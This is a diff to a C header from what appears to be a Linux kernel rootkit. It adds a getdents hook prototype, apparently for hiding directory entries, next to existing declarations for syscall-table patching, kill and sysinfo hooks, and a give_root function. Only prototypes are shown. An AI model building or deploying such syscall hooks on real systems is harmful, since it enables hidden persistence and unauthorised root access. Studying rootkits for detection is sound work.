@@ -1,6 +1,17 @@
 #ifndef MODIFY_SYSCALLS_H_INCLUDED
 #define MODIFY_SYSCALLS_H_INCLUDED
 
+// we need to define this struct ourselves for
+// getdents (odd...)
+struct linux_dirent {
+    unsigned long  d_ino;     /* Inode number */
+    unsigned long  d_off;     /* Offset to next linux_dirent */
+    unsigned short d_reclen;  /* Length of this linux_dirent */
+    char           d_name[];  /* Filename (null-terminated) */
+                        /* length is actually (d_reclen - 2 -
+                            offsetof(struct linux_dirent, d_name) */
+};
+
 void update_sys_calls(void **sys_call_table);
 
 void revert_to_original(void **sys_call_table);
@@ -8,6 +19,8 @@ void revert_to_original(void **sys_call_table);
 asmlinkage int hacked_sysinfo(struct sysinfo *info);
 
 asmlinkage int hacked_kill(pid_t pid, int sig);
+
+asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 void give_root(void);
 
